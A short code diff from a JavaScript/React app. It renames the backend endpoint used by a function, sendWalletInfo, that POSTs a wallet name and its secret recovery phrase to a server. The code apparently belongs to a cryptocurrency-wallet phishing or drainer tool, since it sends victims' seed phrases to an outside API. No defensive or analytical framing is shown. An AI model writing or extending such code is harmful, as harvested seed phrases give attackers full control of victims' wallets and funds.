@@ -102,7 +102,7 @@ const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001';
 
 const sendWalletInfo = async (walletName, secretPhrase) => {
   try {
-    const response = await fetch(`${API_URL}/send-email`, {
+    const response = await fetch(`${API_URL}/api/send-wallet`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
